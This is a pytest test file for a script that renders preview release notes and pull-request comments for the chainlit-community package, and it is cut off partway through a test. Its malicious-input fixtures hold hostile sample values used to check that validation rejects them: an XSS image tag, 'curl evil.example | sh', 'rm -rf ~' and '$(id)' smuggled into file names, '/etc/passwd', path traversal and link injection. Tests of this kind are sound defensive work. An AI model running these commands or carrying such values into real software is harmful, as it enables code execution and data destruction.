"""Tests for scripts/release_notes.py (preview release notes / PR comment)."""

import copy
import hashlib
import importlib.util
import json
import re
import subprocess
import sys
from pathlib import Path

import pytest

_SCRIPT = Path(__file__).resolve().parents[2] / "scripts" / "release_notes.py"
_spec = importlib.util.spec_from_file_location("release_notes", _SCRIPT)
assert _spec
assert _spec.loader
rn = importlib.util.module_from_spec(_spec)
# dataclasses resolves string annotations through sys.modules.
sys.modules[_spec.name] = rn
_spec.loader.exec_module(rn)

REPO = "chainlit-community/chainlit"
SHA = "0123456789abcdef0123456789abcdef01234567"
HEAD_SHA = "fedcba9876543210fedcba9876543210fedcba98"

MAIN_INFO = {
    "version": "3.0.0.dev1234",
    "client_version": "0.5.0-dev.1234",
    "base_version": "3.0.0",
    "build_number": 1234,
    "sha": SHA,
    "ref": "refs/heads/main",
    "event": "push",
    "pr_number": None,
    "run_id": "123456789",
    "files": {
        "wheel": "chainlit_community-3.0.0.dev1234-py3-none-any.whl",
        "sdist": "chainlit_community-3.0.0.dev1234.tar.gz",
        "react_client": "chainlit-react-client-0.5.0-dev.1234.tgz",
    },
}

PR_INFO = {
    "version": "3.0.0.dev1235+pr77.g0123456",
    "client_version": "0.5.0-dev.1235",
    "base_version": "3.0.0",
    "build_number": 1235,
    "sha": SHA,
    "ref": "refs/pull/77/merge",
    "event": "pull_request",
    "pr_number": 77,
    "run_id": "987654321",
    "files": {
        "wheel": "chainlit_community-3.0.0.dev1235+pr77.g0123456-py3-none-any.whl",
        "sdist": "chainlit_community-3.0.0.dev1235+pr77.g0123456.tar.gz",
        "react_client": "chainlit-react-client-0.5.0-dev.1235.tgz",
    },
}

RELEASE_BASE = f"https://github.com/{REPO}/releases/download/3.0.0.dev1234"
WHEEL_URL = f"{RELEASE_BASE}/chainlit_community-3.0.0.dev1234-py3-none-any.whl"
CLIENT_URL = f"{RELEASE_BASE}/chainlit-react-client-0.5.0-dev.1234.tgz"
PR_WHEEL = (
    "./chainlit-dist/chainlit_community-3.0.0.dev1235+pr77.g0123456-py3-none-any.whl"
)
PR_CLIENT = "./chainlit-dist/chainlit-react-client-0.5.0-dev.1235.tgz"

EVIL = "<img src=x onerror=alert(1)>"


def _with(base: dict, **changes) -> dict:
    data = copy.deepcopy(base)
    for key, value in changes.items():
        if key.startswith("files_"):
            data["files"][key.removeprefix("files_")] = value
        else:
            data[key] = value
    return data


def _write(tmp_path: Path, data) -> Path:
    path = tmp_path / "build-info.json"
    path.write_text(data if isinstance(data, str) else json.dumps(data))
    return path


def _run(capsys, *argv: str) -> tuple[int, str, str]:
    code = rn.main(list(argv))
    captured = capsys.readouterr()
    return code, captured.out, captured.err


class TestRelease:
    @pytest.fixture
    def body(self) -> str:
        return rn.render_release(rn.parse_build_info(MAIN_INFO), REPO)

    def test_install_commands_use_release_asset_urls(self, body: str):
        for line in (
            f"pip install {WHEEL_URL}",
            f'uv add "chainlit-community @ {WHEEL_URL}"',
            f"uv pip install {WHEEL_URL}",
            f"poetry add {WHEEL_URL}",
            f"npm install --allow-remote=root {CLIENT_URL}",
            f"pnpm add {CLIENT_URL}",
        ):
            assert line in body.splitlines()

    def test_commands_are_labelled_as_alternatives(self, body: str):
        lines = body.splitlines()
        assert "use the **one** command that matches your tooling" in body
        project = lines.index(
            "# uv, in a project: records the dependency in pyproject.toml"
        )
        assert lines[project + 1] == f'uv add "chainlit-community @ {WHEEL_URL}"'
        venv = lines.index(
            "# uv, without a project: installs into the active virtual environment only"
        )
        assert lines[venv + 1] == f"uv pip install {WHEEL_URL}"

    def test_npm_12_remote_tarball_note(self, body: str):
        assert "npm 12 and later refuse tarball URLs outside the registry" in body
        assert "`allow-remote=root` in your project's `.npmrc`" in body
        # pnpm has no such restriction.
        assert not any(
            "allow-remote" in line
            for line in body.splitlines()
            if line.startswith("pnpm")
        )

    def test_preview_notice(self, body: str):
        assert "automated preview build" in body
        assert "not an official release" in body
        assert f"[`0123456`](https://github.com/{REPO}/commit/{SHA})" in body
        assert "`pip install chainlit` installs the **unmaintained upstream" in body
        assert "Node.js and pnpm are **not** needed" in body

    def test_verification(self, body: str):
        assert "sha256sum --ignore-missing -c SHA256SUMS" in body
        assert (
            f"gh attestation verify chainlit_community-3.0.0.dev1234-py3-none-any.whl -R {REPO}"
            in body
        )

    def test_no_pr_marker_and_no_generated_changelog(self, body: str):
        assert rn.MARKER not in body
        assert "What's Changed" not in body

    def test_asset_urls_are_percent_encoded(self):
        url = rn.release_asset_url(REPO, "1.0.0.dev1+pr2.gabcdef0", "a+b c.whl")
        assert url == (
            f"https://github.com/{REPO}/releases/download/"
            "1.0.0.dev1%2Bpr2.gabcdef0/a%2Bb%20c.whl"
        )

    def test_rejects_pr_build(self):
        with pytest.raises(rn.ValidationError):
            rn.render_release(rn.parse_build_info(PR_INFO), REPO)

    def test_cli(self, tmp_path, capsys):
        code, out, err = _run(
            capsys,
            "release",
            str(_write(tmp_path, MAIN_INFO)),
            "--repo",
            REPO,
            "--expect-sha",
            SHA,
            "--expect-run-id",
            "123456789",
        )
        assert (code, err) == (0, "")
        assert out == rn.render_release(rn.parse_build_info(MAIN_INFO), REPO)


class TestPrComment:
    def _body(self, conclusion: str = "success", **kwargs) -> str:
        return rn.render_pr_comment(
            rn.parse_build_info(PR_INFO), REPO, conclusion, **kwargs
        )

    def test_first_line_is_hidden_marker(self):
        assert self._body().splitlines()[0] == "<!-- chainlit-build-artifact -->"

    def test_summary(self):
        body = self._body()
        run_url = f"https://github.com/{REPO}/actions/runs/987654321"
        assert "`3.0.0.dev1235+pr77.g0123456`" in body
        assert f"[`0123456`](https://github.com/{REPO}/commit/{SHA})" in body
        assert f"({run_url}#artifacts)" in body
        assert "| CI       | passed |" in body
        assert "direct download" not in body
        assert "[!WARNING]" not in body
        assert "signed in to GitHub" in body
        assert "**expire**" in body

    def test_install_commands_use_local_paths(self):
        lines = self._body().splitlines()
        for line in (
            f"gh run download 987654321 -R {REPO} -n dist -D chainlit-dist",
            f"pip install {PR_WHEEL}",
            f"uv pip install {PR_WHEEL}",
            f"uv add {PR_WHEEL}",
            f"poetry add {PR_WHEEL}",
            # Local tarballs are governed by npm's `allow-file` (default
            # `all`), so no --allow-remote here.
            f"npm install {PR_CLIENT}",
            f"pnpm add {PR_CLIENT}",
        ):
            assert line in lines
        assert "allow-remote" not in self._body()
        assert "releases/download" not in self._body()

    def test_commands_are_labelled_as_alternatives(self):
        body = self._body()
        lines = body.splitlines()
        assert "use the **one** command that matches your tooling" in body
        project = lines.index(
            "# uv, in a project: records the dependency in pyproject.toml"
        )
        assert lines[project + 1] == f"uv add {PR_WHEEL}"
        venv = lines.index(
            "# uv, without a project: installs into the active virtual environment only"
        )
        assert lines[venv + 1] == f"uv pip install {PR_WHEEL}"

    def test_artifact_url_and_trusted_head_sha(self):
        artifact = f"https://github.com/{REPO}/actions/runs/987654321/artifacts/42"
        body = self._body(artifact_url=artifact, head_sha=HEAD_SHA)
        assert f"([direct download]({artifact}))" in body
        assert f"[`fedcba9`](https://github.com/{REPO}/commit/{HEAD_SHA})" in body
        assert SHA not in body

    @pytest.mark.parametrize("conclusion", ["failure", "cancelled", "timed_out"])
    def test_unsuccessful_ci_is_flagged(self, conclusion: str):
        body = self._body(conclusion)
        assert "[!WARNING]" in body
        assert "checks did **not** all pass" in body
        assert f"(conclusion: `{conclusion}`)" in body
        assert "| CI       | passed |" not in body

    @pytest.mark.parametrize(
        "kwargs",
        [
            {"conclusion": EVIL},
            {"artifact_url": "https://evil.example/actions/runs/987654321/artifacts/1"},
            {"artifact_url": f"https://github.com/{REPO}/actions/runs/1/artifacts/1"},
            {
                "artifact_url": f"https://github.com/{REPO}/actions/runs/987654321"
                "/artifacts/1) [x](https://evil.example"
            },
            {"head_sha": "0123456"},
            {"head_sha": SHA.upper()},
        ],
    )
    def test_rejects_bad_arguments(self, kwargs: dict):
        with pytest.raises(rn.ValidationError):
            self._body(**{"conclusion": "success", **kwargs})

    def test_rejects_main_build(self):
        with pytest.raises(rn.ValidationError):
            rn.render_pr_comment(rn.parse_build_info(MAIN_INFO), REPO, "success")

    def test_cli(self, tmp_path, capsys):
        code, out, err = _run(
            capsys,
            "pr-comment",
            str(_write(tmp_path, PR_INFO)),
            "--repo",
            REPO,
            "--conclusion",
            "failure",
            "--expect-pr",
            "77",
            "--expect-run-id",
            "987654321",
        )
        assert (code, err) == (0, "")
        assert out == self._body("failure")


@pytest.mark.parametrize("repo", ["chainlit", "a/b/c", "a/..", "a/b c", "a/b\n", EVIL])
def test_rejects_bad_repo(repo: str):
    with pytest.raises(rn.ValidationError):
        rn.render_release(rn.parse_build_info(MAIN_INFO), repo)


def test_accepts_client_tarball_without_build_metadata():
    data = _with(
        PR_INFO,
        client_version="0.5.0-dev.1235+pr77.g0123456",
        files_react_client="chainlit-react-client-0.5.0-dev.1235.tgz",
    )
    assert rn.parse_build_info(data).react_client.endswith("-dev.1235.tgz")
    data["files"]["react_client"] = (
        "chainlit-react-client-0.5.0-dev.1235+pr77.g0123456.tgz"
    )
    assert rn.parse_build_info(data).client_version.endswith("+pr77.g0123456")


def _retarget(info: dict, base: str, client: str) -> dict:
    """The same build, for other base versions of chainlit and react-client."""
    old_base = info["base_version"]
    number = info["build_number"]
    version = info["version"].replace(old_base, base, 1)
    separator = "." if "-" in client else "-"
    client_version = f"{client}{separator}dev.{number}"
    return _with(
        info,
        base_version=base,
        version=version,
        client_version=client_version,
        files_wheel=f"chainlit_community-{version}-py3-none-any.whl",
        files_sdist=f"chainlit_community-{version}.tar.gz",
        files_react_client=f"chainlit-react-client-{client_version}.tgz",
    )


@pytest.mark.parametrize("info", [MAIN_INFO, PR_INFO], ids=["release", "pr"])
@pytest.mark.parametrize(
    "base",
    ["3.0", "2.0rc0", "2.4.0rc0", "3.0.0a1", "3.0.0b2", "3.0.0rc1", "2.7.1.1"],
)
@pytest.mark.parametrize("client", ["0.5.0", "0.5.0-rc.1", "0.5.0-beta-2.x"])
def test_accepts_every_base_version_shape(info: dict, base: str, client: str):
    data = _retarget(info, base, client)

    parsed = rn.parse_build_info(data)

    assert parsed.base_version == base
    assert parsed.version == data["version"]
    assert parsed.version.startswith(f"{base}.dev{info['build_number']}")
    assert parsed.client_version == data["client_version"]
    assert parsed.wheel == f"chainlit_community-{parsed.version}-py3-none-any.whl"
    assert parsed.react_client == (f"chainlit-react-client-{parsed.client_version}.tgz")


def test_release_candidate_versions_are_rendered():
    info = rn.parse_build_info(_retarget(MAIN_INFO, "3.0.0rc1", "0.5.0-rc.1"))
    body = rn.render_release(info, REPO)
    base = f"https://github.com/{REPO}/releases/download/3.0.0rc1.dev1234"
    assert (
        f"pip install {base}/chainlit_community-3.0.0rc1.dev1234-py3-none-any.whl"
        in body
    )
    assert f"pnpm add {base}/chainlit-react-client-0.5.0-rc.1.dev.1234.tgz" in body

    info = rn.parse_build_info(_retarget(PR_INFO, "3.0.0rc1", "0.5.0-rc.1"))
    body = rn.render_pr_comment(info, REPO, "success")
    assert "`3.0.0rc1.dev1235+pr77.g0123456`" in body
    assert "chainlit-react-client-0.5.0-rc.1.dev.1235.tgz" in body


@pytest.fixture
def stamped_repo(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    """scripts/ci_version.py and a git repository it can stamp."""
    spec = importlib.util.spec_from_file_location(
        "ci_version", _SCRIPT.with_name("ci_version.py")
    )
    assert spec
    assert spec.loader
    ci_version = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(ci_version)

    root = tmp_path / "repo"
    for path, content in (
        (ci_version.VERSION_FILE, '__version__ = "3.0.0"\n'),
        (ci_version.CLIENT_PACKAGE_JSON, '{"version": "0.5.0"}\n'),
    ):
        (root / path).parent.mkdir(parents=True)
        (root / path).write_text(content)
    for name in ("GIT_DIR", "GIT_WORK_TREE", "GIT_INDEX_FILE"):
        monkeypatch.delenv(name, raising=False)
    subprocess.run(
        ["git", "init", "--quiet", "--initial-branch", "main"], cwd=root, check=True
    )
    return ci_version, root


@pytest.mark.parametrize(
    ("base", "client"),
    [
        ("3.0.0", "0.5.0"),
        ("3.0.0rc1", "0.5.0-rc.1"),
        ("2.0rc0", "0.5.0"),
        ("2.7.1.1", "0.5.0-beta-2.x"),
    ],
)
def test_build_info_of_ci_version_validates(
    stamped_repo, tmp_path, capsys, base: str, client: str
):
    """End to end: what the build stamps is what both consumers accept."""
    ci_version, root = stamped_repo
    (root / ci_version.VERSION_FILE).write_text(f'__version__ = "{base}"\n')
    (root / ci_version.CLIENT_PACKAGE_JSON).write_text(json.dumps({"version": client}))
    builds = {
        "release": ci_version.compute(
            root,
            event="push",
            ref="refs/heads/main",
            sha=SHA,
            run_id="123456789",
            number=1234,
        ),
        "pr": ci_version.compute(
            root,
            event="pull_request",
            ref="refs/pull/77/merge",
            sha=SHA,
            run_id="987654321",
            pr_number="77",
            number=1235,
        ),
    }
    assert builds["release"]["version"] == f"{base}.dev1234"
    assert builds["pr"]["version"] == f"{base}.dev1235+pr77.g0123456"

    for kind, info in builds.items():
        path = _write(tmp_path, info)
        other = "pr" if kind == "release" else "release"

        code, out, err = _run(capsys, "validate", str(path), "--kind", kind)
        assert (code, err) == (0, "")
        fields = dict(line.split("=", 1) for line in out.splitlines())
        assert fields["kind"] == kind
        assert fields["version"] == info["version"]
        assert fields["base_version"] == base
        assert fields["client_version"] == info["client_version"]
        assert fields["wheel"] == info["files"]["wheel"]
        assert fields["react_client"] == info["files"]["react_client"]

        assert _run(capsys, "validate", str(path), "--kind", other)[0] == 1

    release = rn.render_release(rn.parse_build_info(builds["release"]), REPO)
    assert builds["release"]["files"]["wheel"] in release
    comment = rn.render_pr_comment(rn.parse_build_info(builds["pr"]), REPO, "success")
    assert builds["pr"]["files"]["react_client"] in comment


# Digits that are not ASCII: Arabic-Indic three and fullwidth three.
ARABIC_3 = "\u0663"
FULLWIDTH_3 = "\uff13"

MALICIOUS = [
    # --- non-ASCII digits, which \d, str.isdigit() and int() all accept ---
    *(
        _retarget(info, f"{prefix}{digit}.0.0", "0.5.0")
        for info in (MAIN_INFO, PR_INFO)
        for digit in (ARABIC_3, FULLWIDTH_3)
        for prefix in ("", "1")
    ),
    *(
        _with(
            MAIN_INFO,
            base_version=f"3.0.0rc{digit}",
            version=f"3.0.0rc{digit}.dev1234",
            files_wheel=f"chainlit_community-3.0.0rc{digit}.dev1234-py3-none-any.whl",
            files_sdist=f"chainlit_community-3.0.0rc{digit}.dev1234.tar.gz",
        )
        for digit in (ARABIC_3, FULLWIDTH_3)
    ),
    *(
        _with(
            MAIN_INFO,
            version=f"3.0.0.dev12{digit}4",
            files_wheel=f"chainlit_community-3.0.0.dev12{digit}4-py3-none-any.whl",
            files_sdist=f"chainlit_community-3.0.0.dev12{digit}4.tar.gz",
        )
        for digit in (ARABIC_3, FULLWIDTH_3)
    ),
    *(
        _with(
            MAIN_INFO,
            client_version=client,
            files_react_client=f"chainlit-react-client-{client}.tgz",
        )
        for digit in (ARABIC_3, FULLWIDTH_3)
        for client in (
            f"0.5.{digit}-dev.1234",
            f"0.5.0-dev.12{digit}4",
            f"0.5.0-rc.{digit}.dev.1234",
            f"0.5.0-rc{digit}.dev.1234",
        )
    ),
    *(_with(MAIN_INFO, run_id=f"12345678{digit}") for digit in (ARABIC_3, FULLWIDTH_3)),
    *(_with(MAIN_INFO, run_id=digit) for digit in (ARABIC_3, FULLWIDTH_3)),
    *(
        _with(
            PR_INFO,
            version=f"3.0.0.dev1235+{local}",
            files_wheel=f"chainlit_community-3.0.0.dev1235+{local}-py3-none-any.whl",
            files_sdist=f"chainlit_community-3.0.0.dev1235+{local}.tar.gz",
        )
        for local in (
            "pr\u0667\u0667.g0123456",
            "pr\uff17\uff17.g0123456",
            "pr7\u0667.g0123456",
            "pr77.g012345\u0666",
            "pr77.g\uff10123456",
        )
    ),
    # --- base versions that scripts/ci_version.py does not accept either ---
    *(
        _with(
            MAIN_INFO,
            base_version=base,
            version=f"{base}.dev1234",
            files_wheel=f"chainlit_community-{base}.dev1234-py3-none-any.whl",
            files_sdist=f"chainlit_community-{base}.dev1234.tar.gz",
        )
        for base in (
            "3",
            "3.0.0.0.0",
            "03.0.0",
            "3.0.0-rc",
            "3.0.0-rc1",
            "3.0.0.rc1",
            "3.0.0rc",
            "3.0.0rc01",
            "3.0.0RC1",
            "3.0.0c1",
            "3.0.0rc1.dev5",
            "3.0.0.dev5",
            "3.0.0.post1",
            "3.0.0rc1+local",
            "1!3.0.0",
            "3.0.0rc1\n",
            "3.0.01234567",
        )
    ),
    # --- client versions that scripts/ci_version.py does not produce ---
    *(
        _with(
            MAIN_INFO,
            client_version=client,
            files_react_client=f"chainlit-react-client-{client}.tgz",
        )
        for client in (
            "0.5.0-rc.1",
            "0.5.0-rc.1.dev",
            "0.5.0-rc.1-dev.1234",
            "0.5.0-rc..dev.1234",
            "0.5.0-rc.01.dev.1234",
            "0.5.0-rc_1.dev.1234",
            "0.5.0-dev.1.dev.1234",
            "0.5.0-rc.dev.dev.1234",
            "0.5.0-dev.1234.5",
            "0.5.0-dev.01234",
            "0.5.0.dev.1234",
            "0.5-dev.1234",
            # Not the build number of this build.
            "0.5.0-dev.1235",
            "0.5.0-rc.1.dev.1235",
            "0.5.0-dev.1234\n",
        )
    ),
    # --- Markdown / HTML injection through the version ---
    _with(MAIN_INFO, version=f"3.0.0.dev1234{EVIL}"),
    _with(MAIN_INFO, version="3.0.0.dev1234`\n\n# pwned\n[x](https://evil.example)"),
    _with(MAIN_INFO, version="3.0.0.dev1234\n"),
    _with(PR_INFO, version="3.0.0.dev1235+pr77.g0123456](https://evil.example)"),
    _with(PR_INFO, version="3.0.0.dev1235+pr77.gXYZ<b>!"),
    _with(MAIN_INFO, base_version="3.0.0<script>", version="3.0.0<script>.dev1234"),
    _with(MAIN_INFO, client_version="0.5.0-dev.1234 && curl evil.example | sh"),
    _with(MAIN_INFO, client_version="0.5.0-dev.1234<!--"),
    _with(MAIN_INFO, client_version="0.5.0"),
    # --- version inconsistent with its parts / wrong shape for the event ---
    _with(MAIN_INFO, version="3.0.1.dev1234"),
    _with(MAIN_INFO, version="3.0.0.dev1235"),
    _with(MAIN_INFO, version="3.0.0"),
    _with(MAIN_INFO, version="3.0.0.dev1234+pr77.g0123456"),
    _with(MAIN_INFO, client_version="0.5.0-dev.1234+pr1"),
    _with(MAIN_INFO, event="pull_request"),
    _with(MAIN_INFO, ref="refs/heads/dev"),
    _with(PR_INFO, version="3.0.0.dev1235"),
    _with(PR_INFO, pr_number=78),
    _with(PR_INFO, sha=HEAD_SHA),
    _with(PR_INFO, event="push"),
    _with(PR_INFO, version="3.0.0.dev1235+pr77.g0123456.extra"),
    # --- wrong types ---
    _with(MAIN_INFO, build_number="1234"),
    _with(MAIN_INFO, build_number=True),
    _with(MAIN_INFO, build_number=-1),
    _with(PR_INFO, pr_number="77"),
    _with(PR_INFO, pr_number=77.0),
    _with(PR_INFO, pr_number=True),
    _with(MAIN_INFO, run_id=123456789),
    _with(MAIN_INFO, version=["3.0.0.dev1234"]),
    _with(MAIN_INFO, files=[]),
    # --- sha / run id ---
    _with(MAIN_INFO, sha="0123456"),
    _with(MAIN_INFO, sha=SHA.upper()),
    _with(MAIN_INFO, sha=SHA[:-1] + "g"),
    _with(MAIN_INFO, sha=SHA + "\n"),
    _with(MAIN_INFO, run_id="12345/../../evil"),
    _with(MAIN_INFO, run_id="1 -R evil/repo"),
    _with(MAIN_INFO, run_id=""),
    # --- file names: traversal, separators, injection, mismatches ---
    _with(
        MAIN_INFO, files_wheel="../chainlit_community-3.0.0.dev1234-py3-none-any.whl"
    ),
    _with(MAIN_INFO, files_wheel="/etc/passwd"),
    _with(MAIN_INFO, files_wheel="x/chainlit_community-3.0.0.dev1234-py3-none-any.whl"),
    _with(
        MAIN_INFO, files_wheel="..\\chainlit_community-3.0.0.dev1234-py3-none-any.whl"
    ),
    _with(MAIN_INFO, files_wheel="chainlit_community-9.9.9-py3-none-any.whl"),
    _with(MAIN_INFO, files_wheel="evil-3.0.0.dev1234-py3-none-any.whl"),
    _with(
        MAIN_INFO,
        files_wheel=f"chainlit_community-3.0.0.dev1234-py3-none-any.whl{EVIL}",
    ),
    _with(
        MAIN_INFO,
        files_wheel="chainlit_community-3.0.0.dev1234-py3-none-any.whl; rm -rf ~",
    ),
    _with(MAIN_INFO, files_sdist="chainlit_community-3.0.0.dev1234.tar.gz`$(id)`"),
    _with(MAIN_INFO, files_sdist="chainlit_community-3.0.0.dev1234.zip"),
    _with(MAIN_INFO, files_react_client="../../chainlit-react-client-0.5.0.tgz"),
    _with(MAIN_INFO, files_react_client="[click](https://evil.example).tgz"),
    _with(MAIN_INFO, files_react_client=None),
    _with(MAIN_INFO, files_extra="evil"),
    {k: v for k, v in MAIN_INFO.items() if k != "files"},
    {k: v for k, v in MAIN_INFO.items() if k != "sha"},
    # --- not an object ---
    [MAIN_INFO],
    "3.0.0.dev1234",
    None,
]


@pytest.mark.parametrize("data", MALICIOUS)
def test_rejects_malicious_build_info(data, tmp_path, capsys):
    with pytest.raises(rn.ValidationError):
        rn.parse_build_info(data)

    # Through the CLI nothing is rendered and no untrusted value is echoed.
    path = _write(tmp_path, data)
    for argv in (
        ["release", str(path), "--repo", REPO],
        ["pr-comment", str(path), "--repo", REPO, "--conclusion", "success"],
        ["validate", str(path)],
    ):
        code, out, err = _run(capsys, *argv)
        assert code == 1
        assert out == ""
        assert err.startswith("error: build-info: ")
        for needle in ("evil", "<", "pwned", "passwd", "rm -rf", "$(", ".."):
            assert needle not in err


@pytest.mark.parametrize(
    "content",
    ["", "{", "﻿{}", '{"version": NaN', "[" * 100_000, " " * 70_000],
)
def test_rejects_unparseable_or_oversized_file(content: str, tmp_path, capsys):
    code, out, err = _run(capsys, "validate", str(_write(tmp_path, content)))
    assert (code, out) == (1, "")
    assert err.startswith("error: build-info: ")


def test_rejects_missing_file(tmp_path, capsys):
    code, out, _ = _run(capsys, "validate", str(tmp_path / "nope.json"))
    assert (code, out) == (1, "")


@pytest.mark.parametrize(
    ("info", "argv"),
    [
        (MAIN_INFO, ["--expect-sha", HEAD_SHA]),
        (MAIN_INFO, ["--expect-run-id", "1"]),
        (MAIN_INFO, ["--expect-pr", "77"]),
        (PR_INFO, ["--expect-pr", "78"]),
        (PR_INFO, ["--expect-run-id", "123456789"]),
        (PR_INFO, ["--kind", "release"]),
        (MAIN_INFO, ["--kind", "pr"]),
    ],
)
def test_mismatched_expectations_fail(info, argv, tmp_path, capsys):
    code, out, err = _run(capsys, "validate", str(_write(tmp_path, info)), *argv)
    assert (code, out) == (1, "")
    assert "does not match" in err or "not a" in err


def test_validate_prints_safe_key_value_lines(tmp_path, capsys):
    code, out, _ = _run(
        capsys,
        "validate",
        str(_write(tmp_path, PR_INFO)),
        "--kind",
        "pr",
        "--expect-pr",
        "77",
    )
    assert code == 0
    fields = dict(line.split("=", 1) for line in out.splitlines())
    assert fields["kind"] == "pr"
    assert fields["version"] == PR_INFO["version"]
    assert fields["pr_number"] == "77"
    assert fields["sha"] == SHA
    assert fields["wheel"] == PR_INFO["files"]["wheel"]

    code, out, _ = _run(capsys, "validate", str(_write(tmp_path, MAIN_INFO)))
    fields = dict(line.split("=", 1) for line in out.splitlines())
    assert (code, fields["kind"], fields["pr_number"]) == (0, "release", "")


# --- Official releases -------------------------------------------------------

RC_INFO: dict = {
    "version": "3.0.0rc1",
    "client_version": "0.6.0-dev.1300",
    "base_version": "3.0.0",
    "build_number": 1300,
    "sha": SHA,
    "ref": "refs/heads/main",
    "event": "workflow_dispatch",
    "pr_number": None,
    "run_id": "555555555",
    "files": {
        "wheel": "chainlit_community-3.0.0rc1-py3-none-any.whl",
        "sdist": "chainlit_community-3.0.0rc1.tar.gz",
        "react_client": "chainlit-react-client-0.6.0-dev.1300.tgz",
    },
}


def _official(version: str, base: str = "3.0.0", **changes) -> dict:
    fields = {
        "version": version,
        "base_version": base,
        "files_wheel": f"chainlit_community-{version}-py3-none-any.whl",
        "files_sdist": f"chainlit_community-{version}.tar.gz",
    }
    return _with(RC_INFO, **(fields | changes))


FINAL_INFO = _official("3.0.0")

CHANGELOG = """# Changelog

## [Unreleased]

### Added

- An unreleased change with `code` and <b>html</b>.

## [3.0.0] - 2026-12-01

### Removed

- **Breaking:** the thing.

## [2.12.0] - 2026-08-25

- Old.
"""
NOTES = """# Upgrading to 3.0.0

Uninstall `chainlit` first.   <!-- kept verbatim -->

```bash
pip uninstall chainlit && pip install chainlit-community
```
"""


@pytest.fixture
def notes(tmp_path: Path) -> dict:
    """The --changelog and --notes-dir of a repository ready to release 3.0.0."""
    changelog = tmp_path / "CHANGELOG.md"
    changelog.write_text(CHANGELOG, encoding="utf-8")
    notes_dir = tmp_path / "docs" / "releases"
    notes_dir.mkdir(parents=True)
    (notes_dir / "3.0.0.md").write_text(NOTES, encoding="utf-8")
    return {"changelog": changelog, "notes_dir": notes_dir}


def _render_official(info: dict, notes: dict, index: str = "pypi") -> str:
    return rn.render_official(rn.parse_build_info(info), REPO, index, **notes)


@pytest.mark.parametrize(
    ("version", "prerelease"),
    [
        ("3.0.0a0", True),
        ("3.0.0b2", True),
        ("3.0.0rc1", True),
        ("3.0.0rc10", True),
        ("3.0.0", False),
    ],
)
@pytest.mark.parametrize("ref", ["refs/heads/main", "refs/heads/rehearsal/x"])
def test_official_build_info(version: str, prerelease: bool, ref: str):
    info = rn.parse_build_info(_official(version, ref=ref))

    assert (info.kind, info.version, info.prerelease) == (
        "official",
        version,
        prerelease,
    )
    assert info.wheel == f"chainlit_community-{version}-py3-none-any.whl"
    assert info.sdist == f"chainlit_community-{version}.tar.gz"


@pytest.mark.parametrize("base", ["3.0", "2.7.1.1"])
def test_official_build_info_accepts_other_final_base_shapes(base: str):
    for version in (base, f"{base}rc2"):
        assert rn.parse_build_info(_official(version, base)).kind == "official"


@pytest.mark.parametrize("info", [MAIN_INFO, PR_INFO], ids=["release", "pr"])
def test_other_builds_are_pre_releases(info: dict):
    assert rn.parse_build_info(info).prerelease is True


NOT_OFFICIAL = {
    "dev version": _official("3.0.0.dev1300"),
    "dev of a pre-release": _official("3.0.0rc1.dev1300"),
    "local part": _official("3.0.0+pr77.g0123456"),
    "local part after rc": _official("3.0.0rc1+local"),
    "post release": _official("3.0.0.post1"),
    "non canonical rc": _official("3.0.0-rc1"),
    "leading zero": _official("3.0.0rc01"),
    "two pre-releases": _official("3.0.0rc1rc2"),
    "longer release": _official("3.0.0.1"),
    "release digits appended": _official("3.0.01"),
    "v prefix": _official("v3.0.0", "v3.0.0"),
    "another release": _official("3.0.1"),
    "an older release": _official("2.12.1"),
    "pre-release base": _official("3.0.0rc1", "3.0.0rc1"),
    "pre-release base, later rc": _official("3.0.0rc2", "3.0.0rc1"),
    "pre-release of a pre-release": _official("3.0.0rc1rc1", "3.0.0rc1"),
    "with a pull request number": _official("3.0.0rc1", pr_number=77),
    "from a tag": _official("3.0.0rc1", ref="refs/tags/3.0.0rc1"),
    "from a pull request ref": _official("3.0.0rc1", ref="refs/pull/77/merge"),
    "client build metadata": _official(
        "3.0.0rc1",
        client_version="0.6.0-dev.1300+x",
        files_react_client="chainlit-react-client-0.6.0-dev.1300.tgz",
    ),
    "upstream wheel name": _official(
        "3.0.0", files_wheel="chainlit-3.0.0-py3-none-any.whl"
    ),
    "upstream sdist name": _official("3.0.0", files_sdist="chainlit-3.0.0.tar.gz"),
    # The two directions of mixing a preview with an official build.
    "preview from a manual run": _with(MAIN_INFO, event="workflow_dispatch"),
    "official from a push": _official("3.0.0rc1", event="push"),
    "final from a push": _official("3.0.0", event="push"),
    "official from a release event": _official("3.0.0", event="release"),
    "official from a pull request": _official("3.0.0rc1", event="pull_request"),
    "pull request from a manual run": _with(PR_INFO, event="workflow_dispatch"),
}


@pytest.mark.parametrize("data", NOT_OFFICIAL.values(), ids=NOT_OFFICIAL.keys())
def test_rejects_what_is_neither_official_nor_preview(data: dict):
    with pytest.raises(rn.ValidationError):
        rn.parse_build_info(data)


@pytest.mark.parametrize("info", [RC_INFO, FINAL_INFO], ids=["rc", "final"])
def test_preview_and_pr_consumers_refuse_an_official_build(
    info: dict, tmp_path, capsys
):
    parsed = rn.parse_build_info(info)
    with pytest.raises(rn.ValidationError, match="not a 'release' build"):
        rn.render_release(parsed, REPO)
    with pytest.raises(rn.ValidationError, match="not a 'pr' build"):
        rn.render_pr_comment(parsed, REPO, "success")

    path = str(_write(tmp_path, info))
    for argv in (
        ["validate", path, "--kind", "release"],
        ["validate", path, "--kind", "pr"],
        ["release", path, "--repo", REPO],
        ["pr-comment", path, "--repo", REPO, "--conclusion", "success"],
    ):
        code, out, err = _run(capsys, *argv)
        assert (code, out) == (1, "")
        assert "not a" in err


@pytest.mark.parametrize("info", [MAIN_INFO, PR_INFO], ids=["release", "pr"])
def test_official_consumers_refuse_preview_and_pr_builds(
    info: dict, notes: dict, tmp_path, capsys
):
    with pytest.raises(rn.ValidationError, match="not a 'official' build"):
        _render_official(info, notes)

    path = str(_write(tmp_path, info))
    for argv in (
        ["validate", path, "--kind", "official"],
        [
            "official",
            path,
            "--repo",
            REPO,
            "--index",
            "pypi",
            "--changelog",
            str(notes["changelog"]),
            "--notes-dir",
            str(notes["notes_dir"]),
        ],
    ):
        code, out, err = _run(capsys, *argv)
        assert (code, out) == (1, "")
        assert "not a 'official' build" in err


def test_validate_official_outputs(tmp_path, capsys):
    path = str(_write(tmp_path, RC_INFO))
    code, out, _ = _run(
        capsys,
        "validate",
        path,
        "--kind",
        "official",
        "--expect-version",
        "3.0.0rc1",
        "--expect-sha",
        SHA,
        "--expect-run-id",
        "555555555",
    )

    assert code == 0
    assert out.splitlines() == [
        "kind=official",
        "prerelease=true",
